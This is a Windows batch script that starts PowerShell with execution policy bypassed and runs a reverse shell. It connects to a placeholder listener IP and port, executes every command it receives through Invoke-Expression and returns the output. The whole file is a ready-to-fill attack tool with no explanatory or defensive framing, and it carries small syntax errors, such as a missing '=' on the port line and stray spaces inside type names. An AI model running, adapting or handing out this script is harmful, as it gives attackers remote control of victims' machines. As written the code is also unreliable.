@echo off
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& { 
function Invoke-ReverseShell {
    $IP = 'YOUR_IP_ADDRESS' # Change this to the listener IP address
    $Port 'YOUR_PORT' # Change this to the listener port
    $client = New-Object System.Net.Sockets. TCPClient ($IP, $Port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}

    # Send a connection confirmation
    $sendbytes = ([text.encoding]:: ASCII).GetBytes('Shell Connected`n')
    $stream.Write($sendbytes, 0, $sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        try {
            $sendback = (Invoke-Expression $data 2>&1 | Out-String )
        } catch {
            $sendback = $_. Exception.Message
        }
        $sendback2= $sendback + 'PS ' + (pwd).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}
Invoke-ReverseShell
}"
